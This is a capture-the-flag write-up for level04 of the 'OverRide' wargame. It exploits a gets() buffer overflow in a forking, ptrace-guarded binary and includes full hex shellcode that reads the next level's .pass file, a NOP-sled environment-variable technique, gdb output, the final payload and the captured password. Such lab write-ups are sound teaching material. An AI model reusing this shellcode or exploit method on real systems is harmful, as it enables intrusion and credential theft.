After reversing the program we see there is a fork creating a child process
There is a ptrace function that checks if the parent process is using a call to exec().
If it does it will kills itself and the parent process.

We see there is a buffer which is filled by the gets function.
We are going to use this gets to overflow the buffer and modify the return address.
We find an offset of 156.

So we are going to exploit the gets of the parent process modifying the return address and point it to a shellcode.
Since there is mutliple process it's not going to be easy to find the address of the buffer.
So we're going to use an env variable to store our shellcode.
So as we said earlier we can not use a shellcode that use exec().
So we're going to use a shellcode that open, read then write the .pass of the next level.
Check Ressources directory where there is the .asm of the following shellcode

export SHELLCODE=$(python -c 'print("\x90"*200+"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x01\xc1\xe8\x0a\xcd\x80\x93\xcd\x80")')

I put a nopsled of '\x90'*200 to easily target the shellcode, because we all know address of env variable are very fluctuent with programs that are executed in same time.

So finaly we are going to enter in the parameter program our offset of 156 and our address that point to our nopsled.

We know that there is a pointer which points to env variable which is stored in ebp+x010.

(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) x/wx $ebp+0x10
0xffffd6b8:     0xffffd74c
(gdb) x/wx 0xffffd74c
0xffffd74c:     0xffffd88b
(gdb) x/s 0xffffd88b
0xffffd88b:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\005Qhpassh05/.hevelhrs/lh/usehhomeh////\211\343̀\223\221\260\003f\272\377\017B̀\222\263\001\301\350\ǹ\223̀"

The above shellcode was with a nopsled of only 20*"\x90".
We had trouble to points to the nopsled since, as I said, gdb modify address of env variable.
So after this we modify our shellcode to a 200*"\x90" to easily point to our nopsled.

level04@OverRide:~$ python -c 'print("\x90" * 156 + "\x75\xd8\xff\xff")' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
